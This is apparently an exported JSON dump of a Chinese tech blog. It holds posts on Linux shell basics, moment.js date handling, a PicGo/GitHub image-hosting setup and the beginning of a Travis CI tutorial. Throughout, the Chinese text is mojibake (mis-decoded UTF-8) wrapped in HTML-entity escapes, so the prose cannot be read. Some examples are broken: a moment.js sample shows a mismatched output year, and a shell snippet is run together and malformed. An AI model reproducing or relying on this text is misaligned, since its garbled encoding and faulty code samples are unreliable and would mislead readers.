æ·±å¯¹Linuxçš„Shellã€Shellè„šæœ¬ã€Shellç¯å¢ƒçš„ç†è§£ã€‚ ä»€ä¹ˆæ˜¯Shellï¼Ÿ åœ¨å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼šäººæ˜¯å¦‚ä½•è·Ÿè®¡ç®—æœºæ‰“äº¤é“çš„ï¼Ÿæˆ–è€…è¯´æ€æ ·è®©è®¡ç®—æœºæŒ‰ç…§æˆ‘ä»¬çš„è¦æ±‚å®ŒæˆæŸä¸ªä»»åŠ¡ï¼Ÿ ç°åœ¨å’Œè®¡ç®—æœºäº¤äº’çš„æ–¹å¼å¾ˆç®€å•ï¼Œç›´æ¥ç”¨å›¾å½¢ç•Œé¢çš„å·¥å…·å°±å¥½äº†ï¼Œæƒ³è¦è®¡ç®—æœºå®ŒæˆæŸä¸ªä»»åŠ¡ï¼Œé€šè¿‡æ“ä½œå›¾å½¢ç•Œé¢çš„å·¥å…·å°±èƒ½åˆ°è¾¾ç›®çš„ã€‚ é‚£ä¹ˆåœ¨ä»¥å‰å‘¢ï¼Ÿåœ¨é‚£ä¸ªè®¡ç®—æœºè¿˜æ²¡æœ‰è¿™ä¹ˆå…ˆè¿›çš„æ—¶ä»£å‘¢ï¼Ÿäººä»¬åˆæ˜¯å¦‚ä½•è®©è®¡ç®—å®ŒæˆæŸä¸ªä»»åŠ¡ã€‚é€šè¿‡â€œå‘½ä»¤â€çš„æ–¹å¼å‘Šè¯‰è®¡ç®—æœºæˆ‘éœ€è¦ä½ å¸®ä½ å®Œæˆè¿™ä»¶äº‹ã€‚è¿™ä¸ªâ€œå‘½ä»¤â€åˆæ˜¯æ€ä¹ˆå‘Šè¯‰è®¡ç®—æœºçš„å‘¢ï¼Ÿé€šè¿‡ä¸€ä¸ªäº¤äº’å·¥å…·ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥å®ç°ä¸è®¡ç®—æœºä¹‹é—´çš„â€œä½ é—®æˆ‘ç­”ï¼Œä½ è¯´æˆ‘åšâ€çš„åŠŸèƒ½ã€‚ Shellå°±æ˜¯ä¸€ç§åº”ç”¨ç¨‹åºï¼ˆæ³¨æ„ï¼šæˆ‘è¿™é‡Œç”¨çš„æ˜¯ä¸€ç§ï¼‰ã€‚ è¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼ˆæ–¹ä¾¿æˆ‘ä»¬ä¸è®¡ç®—æœºè¿›è¡Œäº¤äº’ï¼‰ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚ ä»€ä¹ˆæ˜¯Shellè„šæœ¬ï¼ŸShell è„šæœ¬ï¼ˆShell Scriptï¼‰ï¼Œæ˜¯ä¸€ç§ä¸º Shell ç¼–å†™çš„è„šæœ¬ç¨‹åºã€‚ Shell è„šæœ¬ç¼–ç¨‹æœ‰ä¸¤ç§æ–¹å¼ äº¤äº’å¼ï¼ˆInteractiveï¼‰ï¼šç”¨æˆ·æ¯è¾“å…¥ä¸€æ¡å‘½ä»¤å°±ç«‹å³æ‰§è¡Œã€‚ æ‰¹å¤„ç†ï¼ˆBatchï¼‰ï¼šç”±ç”¨æˆ·äº‹å…ˆç¼–å†™å¥½ä¸€ä¸ªå®Œæ•´çš„Shellè„šæœ¬ï¼ŒShellä¼šä¸€æ¬¡æ€§æ‰§è¡Œè„šæœ¬ä¸­è¯¸å¤šçš„å‘½ä»¤ã€‚ ä»€ä¹ˆæ˜¯Shellç¯å¢ƒShellç¼–ç¨‹è·Ÿjavaã€phpç¼–ç¨‹ä¸€æ ·ï¼Œåªè¦æœ‰ä¸€ä¸ªèƒ½ç¼–å†™ä»£ç çš„æ–‡æœ¬ç¼–è¾‘å™¨å’Œä¸€ä¸ªèƒ½è§£é‡Šæ‰§è¡Œçš„è„šæœ¬è§£é‡Šå™¨å°±å¯ä»¥äº†ã€‚ 0x01 Linux Linux é»˜è®¤å®‰è£…äº† Shell è§£é‡Šå™¨ã€‚ åœ¨Linuxä¸­ï¼Œä¸»æµçš„ Shell æ˜¯ Bashã€‚ åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å¹¶ä¸åŒºåˆ† Bourne Shell å’Œ Bourne Again Shellï¼Œæ‰€ä»¥ï¼Œåƒ #!/bin/shï¼Œå®ƒåŒæ ·ä¹Ÿå¯ä»¥æ”¹ä¸º #!/bin/bashã€‚ 0x02 Mac OS Mac OSä¸ä»…å¸¦äº†shã€bashè¿™ä¸¤ä¸ªæœ€åŸºç¡€çš„è§£é‡Šå™¨ï¼Œè¿˜å†…ç½®äº†kshã€cshã€zshç­‰ä¸å¸¸ç”¨çš„è§£é‡Šå™¨ã€‚ 0x03 WindowsWindows å‡ºå‚æ—¶æ²¡æœ‰å†…ç½® Shell è§£é‡Šå™¨ï¼Œé€šå¸¸æˆ‘ä»¬éƒ½æ˜¯å®‰è£…cygwinæˆ–è€…mingw æ¨¡æ‹Ÿå™¨æ¥Linuxç¯å¢ƒã€‚ Cygwin Mingw å¦‚Gitçš„äº¤äº’ç•Œé¢å°±æ˜¯ç”±Mingwæ¨¡æ‹Ÿå™¨æä¾›çš„Bashã€‚ è„šæœ¬è§£é‡Šå™¨12345bash &#x3D;&gt; Bourne Again Shellï¼ˆ&#x2F;bin&#x2F;bashï¼‰sh &#x3D;&gt; Bourne Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;shæˆ–&#x2F;bin&#x2F;shï¼‰csh &#x3D;&gt; C Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;cshï¼‰ksh &#x3D;&gt; K Shellï¼ˆ&#x2F;usr&#x2F;bin&#x2F;kshï¼‰Shell for Rootï¼ˆ&#x2F;sbin&#x2F;shï¼‰ ç¬¬ä¸€ä¸ªShellè„šæœ¬æ‰“å¼€Bashæˆ–è€…ä»»ä½•ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ Hello.shï¼Œæ‰©å±•åä¸ºsh(shä»£è¡¨shell)ã€‚ 123456#!&#x2F;bin&#x2F;bash#ç¬¬ä¸€ä¸ªShellè„šæœ¬#ä½œç”¨æ˜¯åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶çš„è¯¦æƒ…ä¿¡æ¯PWDS&#x3D;echo &#96;pwd&#96;cd $PWDSls -l ä¸Šé¢è¿™ä¸ªè„šæœ¬ä¸­ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„å…ƒç´ ï¼š ç¬¬ä¸€è¡Œçš„è„šæœ¬å£°æ˜ï¼ˆ#!ï¼‰ç”¨æ¥å‘Šè¯‰ç³»ç»Ÿä½¿ç”¨å“ªç§ Shell è§£é‡Šå™¨æ¥æ‰§è¡Œè¯¥è„šæœ¬ï¼› ç¬¬äºŒè¡Œçš„æ³¨é‡Šä¿¡æ¯ï¼ˆ#ï¼‰æ˜¯å¯¹è„šæœ¬åŠŸèƒ½å’ŒæŸäº›å‘½ä»¤çš„ä»‹ç»ä¿¡æ¯ï¼Œä½¿å¾—çœ‹åˆ°è„šæœ¬æ—¶èƒ½å¿«é€Ÿååº”æ˜¯åšä»€ä¹ˆçš„ã€‚ å‰©ä¸‹æ²¡æœ‰å‰ç¼€æ ‡è¯†çš„å°±æ˜¯ æ‰€è¦æ‰§è¡Œçš„è„šæœ¬å…·ä½“å‘½ä»¤äº†ã€‚ è¿è¡ŒShellè„šæœ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š 1. ä½œä¸ºå¯æ‰§è¡Œç¨‹åº12$ chmod +x example.sh # ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™$ .&#x2F;example.sh # æ‰§è¡Œè„šæœ¬ 2. ä½œä¸ºè§£é‡Šå™¨å‚æ•°è¿™ç§è¿è¡Œæ–¹å¼æ˜¯ï¼Œç›´æ¥è¿è¡Œè§£é‡Šå™¨ï¼Œå…¶å‚æ•°å°±æ˜¯shellè„šæœ¬çš„æ–‡ä»¶å: 1234# æ‰§è¡Œè„šæœ¬$ &#x2F;bin&#x2F;sh example.sh$ bash example.sh$ bash example.php ä½¿ç”¨è¿™ç§æ–¹å¼æ—¶ï¼Œå¯ä»¥ä¸ç”¨åœ¨è„šæœ¬ç¬¬ä¸€è¡Œå£°æ˜è§£é‡Šå™¨ä¿¡æ¯ã€‚ 12345678$ cat example.php#è¿™æ˜¯ä¸€ä¸ªç”¨phpå†™çš„Shellè„šæœ¬ï¼Œæœ‰ä¸¤ä¸ªä½œç”¨#1.ç¡®è®¤æ˜¯å¦ç”¨è§£é‡Šå™¨å‚æ•°æ‰§è¡Œshellè„šæœ¬å¯ä»¥ä¸ç”¨å†™å£°æ˜#2.ç¡®è®¤å¦‚ä½•ç”¨phpå†™shellè„šæœ¬string&#x3D;&quot;php shell&quot;echo $string$ bash example.phpphp shell","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"moment.js ç”¨æ³•æ€»ç»“","slug":"moment-js-usage-summary","date":"2020-07-07T10:59:32.000Z","updated":"2020-07-08T16:31:53.649Z","comments":true,"path":"moment-js-usage-summary/","link":"","permalink":"https://www.0x2beace.com/moment-js-usage-summary/","excerpt":"æœ€è¿‘åœ¨åšçš„ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œç»å¸¸ä¼šé‡åˆ°å¯¹æ—¶é—´çš„å¤„ç†ï¼Œå› ä¸ºåŸç”Ÿçš„æ—¶é—´æ ¼å¼å¤„ç†èµ·æ¥å¾ˆè´¹åŠ²ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªè½»é‡çº§çš„æ—¥æœŸå¤„ç†ç±»åº“ã€‚ momentjs æ”¯æŒæ—¥æœŸæ ¼å¼åŒ–ã€Dateã€æ—¶é—´æˆ³ç­‰ç›¸äº’è½¬æ¢ï¼Œå®ƒä½¿å¾—æ“ä½œæ—¶é—´å˜å¾—éå¸¸ç®€å•ã€‚","text":"æœ€è¿‘åœ¨åšçš„ä¸€ä¸ªå‰ç«¯é¡¹ç›®ï¼Œç»å¸¸ä¼šé‡åˆ°å¯¹æ—¶é—´çš„å¤„ç†ï¼Œå› ä¸ºåŸç”Ÿçš„æ—¶é—´æ ¼å¼å¤„ç†èµ·æ¥å¾ˆè´¹åŠ²ï¼Œæ‰€ä»¥å¼•å…¥äº†ä¸€ä¸ªè½»é‡çº§çš„æ—¥æœŸå¤„ç†ç±»åº“ã€‚ momentjs æ”¯æŒæ—¥æœŸæ ¼å¼åŒ–ã€Dateã€æ—¶é—´æˆ³ç­‰ç›¸äº’è½¬æ¢ï¼Œå®ƒä½¿å¾—æ“ä½œæ—¶é—´å˜å¾—éå¸¸ç®€å•ã€‚ å¿«é€Ÿä¸Šæ‰‹momentjsæ”¯æŒå¤šä¸ªç¯å¢ƒï¼Œæ‰€æœ‰çš„ä»£ç éƒ½åº”è¯¥åœ¨è¿™ä¸¤ç§ç¯å¢ƒä¸­éƒ½å¯ä»¥å·¥ä½œã€‚ Node.js12npm install momentvar moment &#x3D; require(&#39;moment&#39;); æµè§ˆå™¨1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;moment.js&#x2F;2.9.0&#x2F;moment.js&quot;&gt;&lt;&#x2F;script&gt; å®ä¾‹è·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ï¼š åˆ›å»º1moment(); ç›¸å½“äºmoment(new Date()) æ­¤å¤„ä¼šè¿”å›ä¸€ä¸ªmomentå°è£…çš„æ—¥æœŸå¯¹è±¡ã€‚ æ ¼å¼åŒ–1234567moment().format(&#39;YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020å¹´07æœˆ07æ—¥ 07:49:38&quot;moment().format(&#39;YYYY-MM-DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020-07-07 07:50:57&quot;moment().format(&#39;YYYY&#x2F;MM&#x2F;DD HH:mm:ss&#39;) &#x2F;&#x2F; &quot;2020&#x2F;07&#x2F;07 07:51:17&quot;moment().format(&#39;hh:m:ss&#39;) &#x2F;&#x2F; &quot;07:51:34&quot;moment().format(&#39;YYYY&#39;) &#x2F;&#x2F; &quot;2020&quot;moment().format(&#39;d&#39;) &#x2F;&#x2F; 2ï¼Œä»Šå¤©æ˜¯å‘¨äºŒmoment().format(&#39;X&#39;) &#x2F;&#x2F; è·å–å½“å‰æ—¶é—´çš„Unixæ—¶é—´æˆ³ è½¬æ¢ä¸ºDateå¯¹è±¡1234moment().toDate() &#x2F;&#x2F; Mon Jan 22 2018 18:11:55 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(&#39;2018-01-20&#39;).toDate() &#x2F;&#x2F; Tue Jan 20 2015 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(&#39;2018-01-22 10:20:15&#39;).toDate() &#x2F;&#x2F; Mon Jan 22 2018 10:20:15 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)moment(1448896064621).toDate() &#x2F;&#x2F;æ¯«ç§’è½¬æ—¥æœŸ è·å–æ—¶é—´ä¿¡æ¯123456789moment().second() &#x2F;&#x2F; è·å–å½“å‰è¿™ä¸€åˆ†é’Ÿçš„å¤šå°‘ç§’moment().date() &#x2F;&#x2F; è·å–å¤©moment().day() &#x2F;&#x2F; è·å–æ˜ŸæœŸmoment().dayOfYear() &#x2F;&#x2F; ä¸€å¹´å†…çš„å¤šå°‘å¤©moment().week() &#x2F;&#x2F; ä¸€å¹´é‡Œçš„å¤šå°‘å‘¨moment().month() &#x2F;&#x2F; è·å–å½“å‰æœˆä»½ï¼ˆå®é™…æœˆä»½-1ï¼‰moment().quarter() &#x2F;&#x2F; ä¸€å¹´å†…çš„ç¬¬å‡ ä¸ªå­£åº¦moment().year() &#x2F;&#x2F; è·å–å¹´ä»½moment().daysInMonth() &#x2F;&#x2F; è·å–å½“æœˆå¤©æ•° æ˜¾ç¤ºä¸€æ—¦è§£æå’Œæ“ä½œå®Œæˆåï¼Œéœ€è¦æŸäº›æ–¹å¼æ¥æ˜¾ç¤º momentã€‚ ä½¿ç”¨formatæ¥æ ¼å¼åŒ–æ—¥æœŸï¼š 123456moment().format() &#x2F;&#x2F; &quot;2020-07-07T08:24:35+08:00&quot;moment.unix(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; å°†Unix æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸæ ¼å¼moment(timestamp).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F; å°†Unix æ¯«ç§’æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸæ ¼å¼moment().unix(); &#x2F;&#x2F; è·å–Unix æ—¶é—´æˆ³moment().format(&quot;X&quot;); &#x2F;&#x2F; è·å–Unix æ—¶é—´æˆ³moment().format(&quot;x&quot;); &#x2F;&#x2F; è·å–Unix æ¯«ç§’æ—¶é—´æˆ³","categories":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://www.0x2beace.com/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://www.0x2beace.com/tags/JavaScript/"}]},{"title":"å¦‚ä½•é€‰æ‹©ä¸€ä¸ªé€‚åˆè‡ªå·±çš„å›¾åºŠ","slug":"how-to-choose-a-picture-bed-that-suits-you","date":"2020-07-06T15:06:33.000Z","updated":"2020-07-10T05:36:37.965Z","comments":true,"path":"how-to-choose-a-picture-bed-that-suits-you/","link":"","permalink":"https://www.0x2beace.com/how-to-choose-a-picture-bed-that-suits-you/","excerpt":"å› ä¸ºæ²¡æœ‰æŠŠåšå®¢éƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯é€‰æ‹©GitHub Pages çš„æ–¹å¼ï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°éœ€è¦æ’å…¥å›¾ç‰‡çš„æ—¶å€™ï¼Œåªèƒ½é€šè¿‡å›¾åºŠæ¥å­˜å‚¨å›¾ç‰‡ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºSM.MS å›¾åºŠåœ¨ä»Šå¤©çªç„¶æŒ‚æ‰äº†ï¼Œæˆ‘å¯èƒ½éƒ½ä¸ä¼šå»æƒ³æ˜¯å¦éœ€è¦æ›´æ¢å›¾åºŠè¿™ä¸ªé—®é¢˜ã€‚ äºæ˜¯æˆ‘å¼€å§‹å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œæœ€ååœ¨ä¼—å¤šå›¾åºŠä¸­ï¼Œæœ€åé€‰æ‹©äº†GitHub å›¾åºŠã€‚ ä½¿ç”¨GitHub å›¾åºŠï¼Œå¯èƒ½å”¯ä¸€çš„é—®é¢˜æ˜¯éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œå¦åˆ™å›¾ç‰‡æ— æ³•åŠ è½½ã€‚","text":"å› ä¸ºæ²¡æœ‰æŠŠåšå®¢éƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œæ˜¯é€‰æ‹©GitHub Pages çš„æ–¹å¼ï¼Œæ‰€ä»¥å¦‚æœé‡åˆ°éœ€è¦æ’å…¥å›¾ç‰‡çš„æ—¶å€™ï¼Œåªèƒ½é€šè¿‡å›¾åºŠæ¥å­˜å‚¨å›¾ç‰‡ã€‚ å¦‚æœä¸æ˜¯å› ä¸ºSM.MS å›¾åºŠåœ¨ä»Šå¤©çªç„¶æŒ‚æ‰äº†ï¼Œæˆ‘å¯èƒ½éƒ½ä¸ä¼šå»æƒ³æ˜¯å¦éœ€è¦æ›´æ¢å›¾åºŠè¿™ä¸ªé—®é¢˜ã€‚ äºæ˜¯æˆ‘å¼€å§‹å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œæœ€ååœ¨ä¼—å¤šå›¾åºŠä¸­ï¼Œæœ€åé€‰æ‹©äº†GitHub å›¾åºŠã€‚ ä½¿ç”¨GitHub å›¾åºŠï¼Œå¯èƒ½å”¯ä¸€çš„é—®é¢˜æ˜¯éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œå¦åˆ™å›¾ç‰‡æ— æ³•åŠ è½½ã€‚ ä¸ºä»€ä¹ˆä¸é€‰æ‹©å›½å†…çš„é‚£äº›å›¾åºŠæœåŠ¡ï¼Ÿ æˆ‘åªæ˜¯æƒ³å­˜ä¸€äº›å›¾ç‰‡ï¼Œè€Œå›½å†…çš„å¤§éƒ¨åˆ†å›¾åºŠæœåŠ¡ï¼Œè¿˜éœ€è¦åšåŸŸåå¤‡æ¡ˆä»¥åŠç»‘å®šå„ç§æœåŠ¡ï¼Œæ„Ÿè§‰å¾ˆç¹çï¼ŒåŠ ä¸Šæˆ‘çš„åŸŸåä¸æ˜¯åœ¨å›½å†…çš„åŸŸåæœåŠ¡å•†é‚£é‡Œä¹°çš„ï¼Œç´¢æ€§å°±æ²¡æœ‰è€ƒè™‘å›½å†…çš„å›¾åºŠæœåŠ¡ã€‚ å›¾åºŠç®¡ç†å·¥å…·æœ‰äº†å›¾åºŠï¼Œå°±éœ€è¦é¡ºæ‰‹é…ç½®ä¸€ä¸ªå›¾åºŠç®¡ç†å·¥å…·ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯ PicGoï¼Œä»…ç›®å‰æ”¯æŒçš„å›¾åºŠå°±æœ‰ï¼šSM.MSå›¾åºŠï¼Œå¾®åšå›¾åºŠï¼Œä¸ƒç‰›å›¾åºŠï¼Œè…¾è®¯äº‘COSï¼Œé˜¿é‡Œäº‘OSSï¼ŒImgurï¼Œåˆæ‹äº‘ï¼ŒGitHub å›¾åºŠç­‰ã€‚ åˆ›å»ºGitHub å›¾åºŠé¦–å…ˆï¼Œä½ å¾—æœ‰ä¸€ä¸ªGitHub è´¦å·ã€‚ 1. æ–°å»ºä¸€ä¸ªä»“åº“è¿™ä¸ªä»“åº“æ˜¯ç”¨äºå­˜å‚¨å›¾ç‰‡ï¼Œæœ€å¥½æ˜¯publicï¼Œå› ä¸ºprivateçš„ä»“åº“ï¼Œå›¾ç‰‡é“¾æ¥ä¼šå¸¦tokenï¼Œè€Œè¿™ä¸ªtokenä¼šå­˜åœ¨è¿‡æœŸçš„é—®é¢˜ã€‚ 2. è·å–æˆæƒtokené€šè¿‡Settings-&gt;Developer settings-&gt;Personal access tokens åˆ›å»ºä¸€ä¸ªæ–°çš„token ç”¨äºPicGoæ“ä½œä½ çš„ä»“åº“ã€‚ æŠŠrepoçš„å‹¾æ‰“ä¸Šå³å¯ï¼Œç‚¹å‡»Generate tokençš„ç»¿è‰²æŒ‰é’®ç”Ÿæˆ tokenã€‚ åˆ›å»ºæˆåŠŸåï¼Œä¼šç”Ÿæˆä¸€ä¸²tokenï¼Œè¿™ä¸²tokenä¹‹åä¸ä¼šå†æ˜¾ç¤ºï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„æ—¶å€™æœ€å¥½ä¿å­˜å¥½ã€‚ é…ç½®PicGoGitHub å›¾åºŠçš„é…ç½®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸‹é¢æ˜¯å‚æ•°è¯´æ˜ã€‚ ä»“åº“åï¼šä½ çš„å›¾åºŠä»“åº“çš„åç§°ï¼Œæ ¼å¼ä¸ºï¼šusername/repository åˆ†æ”¯åï¼šä¸€èˆ¬é€‰æ‹©é»˜è®¤åˆ†æ”¯ master Tokenï¼šåˆšæ‰ç”Ÿæˆçš„ Token å­˜å‚¨è·¯å¾„ï¼šæŒ‡å®šå­˜æ”¾åœ¨ä»“åº“çš„å“ªä¸ªç›®å½•ä¸‹ è‡ªå®šä¹‰åŸŸåï¼šraw.githubusercontent.com/username/repository/branch è‡ªå®šä¹‰åŸŸåæœ€å¥½æŒ‰ç…§ä¸€å®šçš„è§„åˆ™å»å®šä¹‰ï¼šraw.githubusercontent.com+ä½ çš„githubç”¨æˆ·å+ä»“åº“åç§°+åˆ†æ”¯åç§° raw.githubusercontent.com æ˜¯githubç”¨æ¥å­˜å‚¨ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„æœåŠ¡åœ°å€ï¼Œæ˜¯github çš„ç´ ææœåŠ¡å™¨ (assets server)ã€‚ é€šå¸¸é…ç½®å®Œæˆä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚ å¦‚æœä½ ä¸Šä¼ å¤±è´¥çš„æƒ…å†µï¼Œå¯ä»¥æ‰“å¼€PicGo çš„æ—¥å¿—çœ‹çœ‹å…·ä½“æ˜¯ä»€ä¹ˆå¼‚å¸¸ å¦‚æœå¾—åˆ°äº†è¿™æ ·çš„å¼‚å¸¸ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯å› ä¸ºä½ æ²¡æœ‰å¼€å¯å…¨å±€ä»£ç†ã€‚ 1[PicGo ERROR] RequestError: Error: connect ECONNREFUSED 13.250.168.23:443&#96; å› ä¸ºGitHub æœåŠ¡å™¨å’Œå›½å†… GFW çš„é—®é¢˜ä¼šå¯¼è‡´æœ‰æ—¶ä¸Šä¼ æˆåŠŸï¼Œæœ‰æ—¶ä¸Šä¼ å¤±è´¥ï¼Œæ‰€ä»¥éœ€è¦è‡ªå¤‡å¥½ç§‘å­¦ä¸Šç½‘å·¥å…·ã€‚ å¦‚æœä½ è¿˜æœ‰å…¶ä»–é—®é¢˜ï¼Œå¯ä»¥æŸ¥é˜… PicGo FAQã€‚ æ€»ç»“ å¦‚æœä½ å’Œæˆ‘ä¸€æ ·ï¼Œè®¨åŒåŸŸåå¤‡æ¡ˆï¼Œåˆå¸Œæœ›èƒ½æœ‰ä¸€ä¸ªå…è´¹ã€ç¨³å®šçš„å›¾åºŠï¼Œé‚£ä¹ˆä¸€å®šä¸è¦é”™è¿‡GitHub å›¾åºŠã€‚ å¦‚æœä½ åªæ˜¯éœ€è¦å­˜å‚¨ä¸€äº›ä¸æ€ä¹ˆé‡è¦çš„å›¾ç‰‡ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å…è´¹ä¸é™å¤§å°çš„SM.MSå›¾åºŠã€‚ å¦‚æœæ‰“ç®—é•¿æœŸç¨³å®šä½¿ç”¨å¯ä»¥ä¼˜å…ˆé€‰æ‹©åˆæ‹äº‘æˆ–è€…ä¸ƒç‰›äº‘ã€‚","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Skill","slug":"Tutorial/Skill","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/"},{"name":"GitHub","slug":"Tutorial/Skill/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/Skill/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Travis CI å¿«é€Ÿä¸Šæ‰‹","slug":"travis-ci-quick-start","date":"2020-07-05T06:25:58.000Z","updated":"2020-07-09T13:12:54.040Z","comments":true,"path":"travis-ci-quick-start/","link":"","permalink":"https://www.0x2beace.com/travis-ci-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨Github Pages æ­å»ºHexo æ—¶ï¼Œç”¨åˆ°äº†ä¸€é¡¹æ–°æŠ€æœ¯ã€‚hmmâ€¦ä¹Ÿä¸èƒ½è¯´æ˜¯æ–°æŠ€æœ¯å§ï¼Œåªæ˜¯ä¹‹å‰ä¸€ç›´æœ‰å¬è¯´ï¼Œä½†å´æ²¡æœ‰å®é™…ç”¨è¿‡ã€‚ å®ƒå°±æ˜¯æŒç»­é›†æˆï¼Œå¬ä¸Šå»å¥½åƒæ˜¯ä¸€ä¸ªé«˜å¤§ä¸Šçš„æ¦‚å¿µï¼Œä½†é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šå†™å®Œä»£ç æäº¤ä¹‹åï¼Œä¼šæ ¹æ®ä½ çš„è¦æ±‚ï¼Œè‡ªåŠ¨åšç¼–è¯‘æµ‹è¯•ã€‚ å…¶ä¸­æœ€å‡ºåå¤§æ¦‚å°±æ˜¯Travis CIäº†ï¼Œæœ¬æ–‡çš„ç›®çš„å°±æ˜¯å¿«é€Ÿå…¥é—¨ Travis CIã€‚","text":"æœ€è¿‘ä½¿ç”¨Github Pages æ­å»ºHexo æ—¶ï¼Œç”¨åˆ°äº†ä¸€é¡¹æ–°æŠ€æœ¯ã€‚hmmâ€¦ä¹Ÿä¸èƒ½è¯´æ˜¯æ–°æŠ€æœ¯å§ï¼Œåªæ˜¯ä¹‹å‰ä¸€ç›´æœ‰å¬è¯´ï¼Œä½†å´æ²¡æœ‰å®é™…ç”¨è¿‡ã€‚ å®ƒå°±æ˜¯æŒç»­é›†æˆï¼Œå¬ä¸Šå»å¥½åƒæ˜¯ä¸€ä¸ªé«˜å¤§ä¸Šçš„æ¦‚å¿µï¼Œä½†é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šå†™å®Œä»£ç æäº¤ä¹‹åï¼Œä¼šæ ¹æ®ä½ çš„è¦æ±‚ï¼Œè‡ªåŠ¨åšç¼–è¯‘æµ‹è¯•ã€‚ å…¶ä¸­æœ€å‡ºåå¤§æ¦‚å°±æ˜¯Travis CIäº†ï¼Œæœ¬æ–‡çš„ç›®çš„å°±æ˜¯å¿«é€Ÿå…¥é—¨ Travis CIã€‚ ä»€ä¹ˆæ˜¯æŒç»­é›†æˆï¼ŸæŒç»­é›†æˆ(Continuous Integration)æ˜¯å¯¹å°å‘¨æœŸçš„çš„ä»£ç è¿›è¡Œæ›´æ”¹ï¼Œå…¶ç›®çš„æ˜¯é€šè¿‡ä»¥è¾ƒå°çš„å¢é‡å¼€å‘å’Œæµ‹è¯•æ¥æ„å»ºæ›´å¥åº·çš„è½¯ä»¶ã€‚ è€ŒTravis CI ä½œä¸ºä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œé€šè¿‡è‡ªåŠ¨æ„å»ºå’Œæµ‹è¯•ä»£ç ï¼Œå¹¶æä¾›æ›´æ”¹æˆåŠŸçš„å³æ—¶åé¦ˆã€‚ å¿«é€Ÿä¸Šæ‰‹åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦æå‰å‡†å¤‡å¥½ä»¥ä¸‹å…ˆå†³æ¡ä»¶ï¼š ä¸€ä¸ª GitHub å¸æˆ· æ‰˜ç®¡åœ¨ Github çš„é¡¹ç›®çš„æ‰€æœ‰è€…æƒé™ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šTravis 